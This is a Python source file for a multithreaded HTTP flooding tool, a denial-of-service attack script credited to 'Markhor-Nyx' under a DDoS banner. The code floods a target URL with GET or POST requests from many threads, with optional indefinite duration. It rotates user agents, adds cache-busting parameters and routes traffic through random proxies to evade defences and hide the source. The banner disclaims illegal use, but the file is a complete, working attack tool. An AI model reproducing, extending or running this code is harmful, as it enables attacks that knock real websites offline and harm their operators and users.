import requests
import threading
import time
import random
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import colorama
import os # For checking proxy file existence

# --- Configuration & Globals ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
]

stop_event = threading.Event()
stats = {
    "sent": 0, "successful_2xx": 0, "redirects_3xx": 0, "client_errors_4xx": 0,
    "server_errors_5xx": 0, "connection_errors": 0, "timeout_errors": 0,
    "proxy_errors": 0, "other_errors": 0, "lock": threading.Lock()
}
loaded_proxies = [] # Global list for proxies

colorama.init(autoreset=True)

# --- Helper Functions ---
def print_banner(): # (Banner code same as before, yahan dobara nahi likh raha for brevity)
    print(colorama.Fore.MAGENTA + """
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS 
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S            
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS         
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS    
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS  
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S 
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS 
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
""")
    print(colorama.Fore.CYAN + "             --- Advanced HTTP Flooder Tool (with Proxy Support) ---") # Updated title
    print(colorama.Fore.BLUE + "                 Developed by: Markhor-Nyx")
    print(colorama.Fore.BLUE + "         Copyright (C) Markhor-Nyx. All rights reserved.")
    print(colorama.Fore.RED + "\n========================= WARNING! =========================")
    print(colorama.Fore.YELLOW + "This tool is for EDUCATIONAL AND AUTHORIZED TESTING ONLY.")
    print(colorama.Fore.YELLOW + "Using this tool against systems without explicit permission is ILLEGAL.")
    print(colorama.Fore.YELLOW + "You are solely responsible for your actions.")
    print(colorama.Fore.RED + "==========================================================\n")


def update_stat(key, count=1):
    with stats["lock"]:
        stats[key] += count

def add_cache_bust(url_string):
    parsed_url = urlparse(url_string)
    query_params = parse_qs(parsed_url.query)
    query_params['markhor_bust'] = [str(random.randint(10000, 99999))]
    new_query_string = urlencode(query_params, doseq=True)
    return urlunparse(parsed_url._replace(query=new_query_string))

def load_proxies_from_file(filepath):
    global loaded_proxies
    if not filepath or not os.path.exists(filepath):
        if filepath: # Only print error if a path was given but not found
             print(colorama.Fore.RED + f"Error: Proxy file '{filepath}' not found.")
        return False
    try:
        with open(filepath, 'r') as f:
            proxies_in_file = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        formatted_proxies = []
        for p in proxies_in_file:
            if not p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                # Assume http if no protocol specified, can be made smarter
                formatted_proxies.append(f"http://{p}")
            else:
                formatted_proxies.append(p)
        
        loaded_proxies = formatted_proxies
        if not loaded_proxies:
            print(colorama.Fore.YELLOW + f"Warning: Proxy file '{filepath}' is empty or contains only comments.")
            return False
        print(colorama.Fore.GREEN + f"Successfully loaded {len(loaded_proxies)} proxies from '{filepath}'.")
        return True
    except Exception as e:
        print(colorama.Fore.RED + f"Error reading proxy file '{filepath}': {e}")
        return False

def get_random_proxy():
    if not loaded_proxies:
        return None
    proxy_url = random.choice(loaded_proxies)
    # requests library expects proxies in a dict like {'http': 'http://...', 'https': 'https://...'}
    # It intelligently handles socks if protocol is socks5:// in the URL
    return {
        "http": proxy_url,
        "https": proxy_url # Same proxy for http and https targets
    }

# --- Attack Functions ---
def http_flood_worker(target_url, method, session, rps_per_thread, post_data=None, request_timeout=10, use_proxies=False):
    inter_request_delay = 1.0 / rps_per_thread if rps_per_thread > 0 else 0
    
    while not stop_event.is_set():
        current_proxy_dict = None
        if use_proxies:
            current_proxy_dict = get_random_proxy()
            if not current_proxy_dict: # No proxies loaded or list empty
                # Fallback to direct connection or skip? For now, let's go direct if proxies fail to load
                # A better approach might be to stop if proxies are mandatory and none work.
                # print(colorama.Fore.YELLOW + "Warning: No proxies available, attempting direct connection.", end='\r')
                pass

        try:
            user_agent = random.choice(USER_AGENTS)
            headers = {'User-Agent': user_agent}
            final_url = add_cache_bust(target_url) if method == "GET" else target_url
            response = None

            if method == "GET":
                response = session.get(final_url, headers=headers, timeout=request_timeout, proxies=current_proxy_dict)
            elif method == "POST":
                response = session.post(final_url, headers=headers, data=post_data, timeout=request_timeout, proxies=current_proxy_dict)
            
            update_stat("sent")
            if 200 <= response.status_code < 300: update_stat("successful_2xx")
            elif 300 <= response.status_code < 400: update_stat("redirects_3xx")
            elif 400 <= response.status_code < 500: update_stat("client_errors_4xx")
            elif 500 <= response.status_code < 600: update_stat("server_errors_5xx")
            
            if inter_request_delay > 0: time.sleep(inter_request_delay)

        except requests.exceptions.ProxyError as e:
            update_stat("proxy_errors")
            # Optionally log which proxy failed: print(f"Proxy error with {current_proxy_dict}: {e}")
        except requests.exceptions.Timeout:
            update_stat("timeout_errors")
        except requests.exceptions.ConnectionError: # Includes DNS failures, refused connections etc.
            update_stat("connection_errors")
        except requests.exceptions.RequestException: # Other requests-related errors
            update_stat("other_errors")
        except Exception: # Catch any other unexpected error in thread
            update_stat("other_errors")
            pass


# --- Statistics Display (same as before, but with proxy_errors) ---
def display_stats_periodically(total_duration, interval=1):
    start_time = time.time()
    last_sent_count = 0
    
    while not stop_event.wait(timeout=interval):
        elapsed_time = time.time() - start_time
        if elapsed_time == 0: elapsed_time = 1
        
        with stats["lock"]:
            current_sent_count = stats["sent"]
            interval_rps = (current_sent_count - last_sent_count) / interval
            last_sent_count = current_sent_count
            overall_avg_rps = current_sent_count / elapsed_time
            
            remaining_time = total_duration - elapsed_time if total_duration > 0 else float('inf')
            progress_char, empty_char = "█", "░"
            
            if total_duration > 0:
                progress_percent = (elapsed_time / total_duration) * 100
                progress_bar_len = 25 # Adjusted for more stats
                filled_len = int(progress_bar_len * progress_percent / 100)
                bar = progress_char * filled_len + empty_char * (progress_bar_len - filled_len)
                progress_str = f"[{bar}] {progress_percent:.1f}%|Left:{remaining_time:.0f}s"
            else:
                progress_str = f"Elapsed:{elapsed_time:.0f}s"

            sys.stdout.write(
                colorama.Fore.YELLOW + \
                f"\r{progress_str} | RPS(now):{interval_rps:<6.1f}|RPS(avg):{overall_avg_rps:<6.1f}| "
                f"Snt:{stats['sent']:<6}|2xx:{stats['successful_2xx']:<4}|3xx:{stats['redirects_3xx']:<3}| "
                f"4xx:{stats['client_errors_4xx']:<3}|5xx:{stats['server_errors_5xx']:<3}| "
                f"ConEr:{stats['connection_errors']:<4}|TmOt:{stats['timeout_errors']:<4}|PrxEr:{stats['proxy_errors']:<4}|Oth:{stats['other_errors']:<3}" + \
                colorama.Style.RESET_ALL
            )
            sys.stdout.flush()
        
        if total_duration > 0 and elapsed_time >= total_duration: break
            
    print()

def print_final_stats(start_time):
    total_time = time.time() - start_time
    if total_time == 0: total_time = 1
    
    print(colorama.Fore.GREEN + "\n--- Attack Finished ---")
    print(f"Total Duration: {total_time:.2f} seconds")
    with stats["lock"]:
        print(f"Total Requests Sent: {stats['sent']}")
        print(f"Avg. Requests Per Second (RPS): {(stats['sent'] / total_time):.2f}")
        print(colorama.Fore.CYAN + "Response Summary:")
        print(f"  Successful (2xx): {stats['successful_2xx']}")
        print(f"  Redirects  (3xx): {stats['redirects_3xx']}")
        print(f"  Client Errors (4xx): {stats['client_errors_4xx']}")
        print(f"  Server Errors (5xx): {stats['server_errors_5xx']}")
        print(colorama.Fore.RED + "Error Summary:")
        print(f"  Connection Errors: {stats['connection_errors']}")
        print(f"  Timeout Errors: {stats['timeout_errors']}")
        print(f"  Proxy Errors: {stats['proxy_errors']}") # New stat
        print(f"  Other Errors: {stats['other_errors']}")
    print("-----------------------")


# --- Main Execution ---
def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="Advanced HTTP Flooder (with Proxy) by Markhor-Nyx.",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("target", help="Target URL (e.g., http://example.com/path)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads (default: 20)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds (0 for indefinite) (default: 60)")
    parser.add_argument("-r", "--rps", type=int, default=0, help="Requests Per Second PER THREAD (0 for max) (default: 0)")
    parser.add_argument("-m", "--method", type=str, default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("-p", "--postdata", type=str, help="Data for POST requests (e.g., 'key=val&k2=v2')")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--proxyfile", type=str, help="File containing list of proxies (one per line, e.g., http://ip:port or socks5://ip:port)")
    # Future: --proxycheck option to validate proxies before use.

    args = parser.parse_args()

    # Validations (same as before, no major change needed here for proxy logic itself)
    if not (args.target.startswith("http://") or args.target.startswith("https://")):
        print(colorama.Fore.RED + "Error: Target URL must start with 'http://' or 'https://'."); sys.exit(1)
    try:
        if not urlparse(args.target).netloc: raise ValueError("Missing domain")
    except ValueError: print(colorama.Fore.RED + "Error: Invalid target URL."); sys.exit(1)
    if args.threads <= 0: print(colorama.Fore.RED + "Error: Threads must be positive."); sys.exit(1)
    if args.duration < 0: print(colorama.Fore.RED + "Error: Duration cannot be negative."); sys.exit(1)
    # ... (other validations same) ...

    use_proxies_flag = False
    if args.proxyfile:
        if load_proxies_from_file(args.proxyfile):
            if loaded_proxies: # Check if any proxies were actually loaded after filtering comments etc.
                use_proxies_flag = True
            else:
                print(colorama.Fore.YELLOW + "Proxy file specified, but no valid proxies found in it. Proceeding without proxies.")
        else:
            # Error message already printed by load_proxies_from_file
            proceed = input(colorama.Fore.YELLOW + "Failed to load proxies. Proceed without proxies? (yes/no): ").lower()
            if proceed != 'yes':
                print(colorama.Fore.RED + "Exiting due to proxy loading failure."); sys.exit(1)
            print(colorama.Fore.YELLOW + "Proceeding without proxies.")


    print(colorama.Fore.GREEN + f"Target: {args.target}")
    print(f"Method: {args.method}")
    if args.method == "POST" and args.postdata: print(f"POST Data: {args.postdata[:50]}{'...' if len(args.postdata)>50 else ''}")
    print(f"Threads: {args.threads}")
    print(f"Duration: {'Infinite' if args.duration == 0 else str(args.duration) + 's'}")
    print(f"RPS per Thread: {'Max' if args.rps == 0 else str(args.rps)}")
    print(f"Request Timeout: {args.timeout}s")
    if use_proxies_flag: print(colorama.Fore.CYAN + f"Using Proxies: Yes ({len(loaded_proxies)} loaded)")
    else: print(colorama.Fore.YELLOW + "Using Proxies: No")


    confirmation = input(colorama.Fore.RED + "\nARE YOU SURE you want to launch this attack? (yes/no): ").lower()
    if confirmation != 'yes': print(colorama.Fore.YELLOW + "Attack cancelled."); sys.exit(0)

    print(colorama.Fore.MAGENTA + "\nStarting attack...")
    
    session = requests.Session()
    threads_list = []
    attack_start_time = time.time()

    stats_thread = threading.Thread(target=display_stats_periodically, args=(args.duration, 1))
    stats_thread.daemon = True
    stats_thread.start()

    for i in range(args.threads):
        thread = threading.Thread(target=http_flood_worker, 
                                  args=(args.target, args.method, session, args.rps, 
                                        args.postdata, args.timeout, use_proxies_flag))
        thread.daemon = True
        thread.start()
        threads_list.append(thread)

    try:
        if args.duration > 0: stop_event.wait(timeout=args.duration)
        else: 
            while not stop_event.is_set(): time.sleep(0.1)
    except KeyboardInterrupt:
        print(colorama.Fore.YELLOW + "\n[!] Ctrl+C detected. Signaling threads to stop...")
    finally:
        stop_event.set()
        print(colorama.Fore.CYAN + "\nWaiting for worker threads to finish (max 2s)...")
        for t in threads_list: t.join(timeout=2)
        if stats_thread.is_alive(): stats_thread.join(timeout=1.5)
        session.close()
        print_final_stats(attack_start_time)
        print(colorama.Fore.MAGENTA + "Tool finished.")

if __name__ == "__main__":
    main()